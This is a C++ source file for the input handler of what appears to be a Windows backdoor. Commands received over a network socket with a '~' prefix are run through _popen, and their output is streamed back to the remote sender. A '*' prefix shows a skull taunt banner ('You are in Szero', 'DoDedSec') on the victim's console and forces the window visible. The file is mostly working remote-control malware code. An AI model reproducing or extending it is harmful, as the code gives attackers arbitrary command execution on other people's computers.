#include "stdafx.h"
#include "InputHandler.h"
#include <iostream>
#include <WinSock2.h>
#include<ImageHlp.h>

using namespace std;

InputHandler::InputHandler()
{

}


int displaySkull()
{
	cout << R"(
                              ..ooo@@@XXX%%%xx..                             ..ooo@@@XXX%%%xx..	                         ..ooo@@@XXX%%%xx.. 
                           .oo@@XXX%x%xxx..     ` .                       .oo@@XXX%x%xxx..     ` . 	                  .oo@@XXX%x%xxx..     ` . 
                         .o@XX%%xx..               ` .                  .o@XX%%xx..               ` .                .o@XX%%xx..               ` .  
                       o@X%..                  ..ooooooo              o@X%..                  ..ooooooo            o@X%..                  ..ooooooo    
                     .@X%x.                 ..o@@^^   ^^@@o         .@X%x.                 ..o@@^^   ^^@@o        .@X%x.                 ..o@@^^   ^^@@o 
                   .ooo@@@@@@ooo..      ..o@@^          @X%       .ooo@@@@@@ooo..      ..o@@^          @X%      .ooo@@@@@@ooo..      ..o@@^          @X%
                   o@@^^^     ^^^@@@ooo.oo@@^             %       o@@^^^     ^^^@@@ooo.oo@@^             %      o@@^^^     ^^^@@@ooo.oo@@^             %
                  xzI    -*--      ^^^o^^        --*-     %      xzI    -*--      ^^^o^^        --*-     %	   xzI    -*--      ^^^o^^        --*-     % 
                  @@@o     ooooooo^@@^o^@X^@oooooo     .X%x      @@@o     ooooooo^@@^o^@X^@oooooo     .X%x     @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
                 I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x    I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x    I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x
                 I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x	
                  @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x      @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x     @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x 	
                   ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx            ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx	      ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx  
                         o@@^^^ooo I^^ I^o ooo   .  x                   o@@^^^ooo I^^ I^o ooo   .  x                o@@^^^ooo I^^ I^o ooo   .  x   	
                         oo @^ IX      I   ^X  @^ oo                    oo @^ IX      I   ^X  @^ oo	                oo @^ IX      I   ^X  @^ oo  
                         IX     U  .        V     IX                    IX     U  .        V     IX	                IX     U  .        V     IX   
                          V     .           .     V                      V     .           .     V                    V     .           .     V   
           

)" << endl;

	cout << R"(
                                                              __  __                                       _                            
                                                              \ \/ /___  __  _______   ____ _________     (_)___     
                                                               \  / __ \/ / / / ___/  / __ `/ ___/ _ \   / / __ \   
                                                               / / /_/ / /_/ / /     / /_/ / /  /  __/  / / / / /  
                                                              /_/\____/\__,_/_/      \__,_/_/   \___/  /_/_/ /_/                                                                                                            
)" << endl;

	cout << R"(
                                                                             _____                     
                                                                            / ___/____  ___  _________ 
                                                                            \__ \/_  / / _ \/ ___/ __ \
                                                                           ___/ / / /_/  __/ /  / /_/ /
                                                                          /____/ /___/\___/_/   \____/            
)" << endl;

	cout << R"(
                         ..ooo@@@XXX%%%xx..                             ..ooo@@@XXX%%%xx.. 	                         ..ooo@@@XXX%%%xx.. 
                      .oo@@XXX%x%xxx..     ` .                       .oo@@XXX%x%xxx..     ` .                     .oo@@XXX%x%xxx..     ` . 
                    .o@XX%%xx..               ` .                  .o@XX%%xx..               ` .                .o@XX%%xx..               ` .  
                  o@X%..                  ..ooooooo              o@X%..                  ..ooooooo            o@X%..                  ..ooooooo    
                .@X%x.                 ..o@@^^   ^^@@o         .@X%x.                 ..o@@^^   ^^@@o        .@X%x.                 ..o@@^^   ^^@@o 
              .ooo@@@@@@ooo..      ..o@@^          @X%       .ooo@@@@@@ooo..      ..o@@^          @X%      .ooo@@@@@@ooo..      ..o@@^          @X%
              o@@^^^     ^^^@@@ooo.oo@@^             %       o@@^^^     ^^^@@@ooo.oo@@^             %      o@@^^^     ^^^@@@ooo.oo@@^             %
             xzI    -*--      ^^^o^^        --*-     %      xzI    -*--      ^^^o^^        --*-     %	  xzI    -*--      ^^^o^^        --*-     % 
             @@@o     ooooooo^@@^o^@X^@oooooo     .X%x      @@@o     ooooooo^@@^o^@X^@oooooo     .X%x     @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
            I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x    I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x    I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x
            I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x	
             @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x      @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x     @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x 	
              ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx            ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx          ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx  
                    o@@^^^ooo I^^ I^o ooo   .  x                   o@@^^^ooo I^^ I^o ooo   .  x	                o@@^^^ooo I^^ I^o ooo   .  x   	
                    oo @^ IX      I   ^X  @^ oo                    oo @^ IX      I   ^X  @^ oo                  oo @^ IX      I   ^X  @^ oo  
                    IX     U  .        V     IX                    IX     U  .        V     IX                  IX     U  .        V     IX   
                     V     .           .     V                      V     .           .     V                    V     .           .     V   
)" << endl;

	HWND hwnd;
	hwnd = FindWindow(_T("ConsoleWindowClass"), NULL); 
	if (hwnd)
	{
		ShowWindow(hwnd, SW_SHOW);             
	}
return 0;
}

char* sub(const char str[])
{
	static char command[511] = { 0 };
	for (int i = 1; i < (int)strlen(str); i++)
	{
		if (str[i] == '\0')
			break;
		command[i - 1] = str[i];
	}
	return command;
}

char* InputHandler::handle(const char str[],SOCKET *sock)
{
	if (str[0]=='~')
	{
		char result[1035] = { 0 };

		FILE *fp;
		fp = _popen(sub(str), "r");
		if (fp == NULL)
		{
			return "Failed to run command\b";
		}

		while (fgets(result, sizeof(result)-1,fp)!=NULL)
		{
			strcat_s(result, "\r");
			send(*sock, result, strlen(result),0);
		}
		_pclose(fp);
		return "_popen taks done.";
	}
	if (str[0] == '*')
	{
		char* skull = "\n\r             ..ooo@@@XXX%%%xx..                     \n\r          .oo@@XXX%x%xxx..     ` .                \n\r        .o@XX%%xx..               ` .             \n\r      o@X%..                  ..ooooooo            \n\r    .@X%x.                 ..o@@^^   ^^@@o      \n\r  .ooo@@@@@@ooo..      ..o@@^          @X%   \n\r  o@@^^^     ^^^@@@ooo.oo@@^             %     \n\r xzI    -*--      ^^^o^^        --*-     %      \n\r @@@o     ooooooo^@@^o^@X^@oooooo     .X%x     \n\rI@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x   \n\rI@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    \n\r @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x     \n\r  ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx            \n\r        o@@^^^ooo I^^ I^o ooo   .  x              \n\r        oo @^ IX      I   ^X  @^ oo                \n\r        IX     U  .        V     IX                \n\r         V     .           .     V                  \n\r";
		char* dodedsec ="\n\r  ____              _          _                \n\r |  _ \\  ___     __| | ___  __| |___  ___  ___  \n\r | | | |/ _ \\   / _` |/ _ \\/ _` / __|/ _ \\/ __| \n\r | |_| | (_) | | (_| |  __/ (_| \\__ \\  __/ (__  \n\r |____/ \\___/   \\__,_|\\___|\\__,_|___/\\___|\\\\___| \n\r";
		displaySkull();
		send(*sock, skull, strlen(skull), 0);
		send(*sock, dodedsec, strlen(dodedsec), 0);
		
	}
	else
	{
		for (int i = 0; i < (int)strlen(str); i++)
		{
			cout << str[i];
		}
	}
	cout << endl;
	return NULL;
}